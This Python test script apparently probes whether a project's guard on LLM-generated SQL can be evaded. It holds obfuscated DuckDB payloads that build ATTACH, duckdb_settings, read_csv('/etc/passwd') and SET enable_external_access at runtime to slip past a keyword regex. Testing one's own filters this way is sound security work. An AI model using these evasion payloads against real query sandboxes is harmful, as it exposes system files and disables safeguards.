import sys
sys.path.insert(0, "/home/user/Anhad23mahajan/lumen")
import app.llm as llm
import pandas as pd

df = pd.DataFrame({"product":["A","B"], "amount":[1,2]})

tests = [
    # Build the word "attach" at runtime via replace() so the literal substring
    # "attach" never appears in the text the regex scans.
    ("replace-built ATTACH via query()",
     "select * from query(replace('at#tach '':memory:'' as x9', '#', ''))"),
    # Build "pragma" similarly to call duckdb_settings (information disclosure) or something blocked
    ("replace-built duckdb_settings via query()",
     "select * from query(replace('select * from duck#db_settings()', '#', ''))"),
    # Build "read_csv" via concat so literal 'read_' substring is split
    ("concat-built read_csv via query()",
     "select * from query('select * from ' || 'read' || '_csv(''/etc/passwd'')')"),
    # via query_table with a constructed identifier is not quite applicable (query_table expects a table name, not arbitrary SQL)
    ("chr()-built SET via query()",
     "select * from query(chr(83)||chr(69)||chr(84)||' enable_external_access=true')"),
]

for name, sql in tests:
    print("="*80); print(name); print("SQL:", sql)
    try:
        g = llm.guard(sql)
        print("guard: PASSED (bypass!)")
    except ValueError as e:
        print("guard: BLOCKED:", e)
        continue
    try:
        res = llm.run_sql(df, sql, timeout=5)
        print("run_sql: EXECUTED shape=", res.shape)
        print(res.head(5))
    except Exception as e:
        print("run_sql ERROR:", type(e).__name__, e)
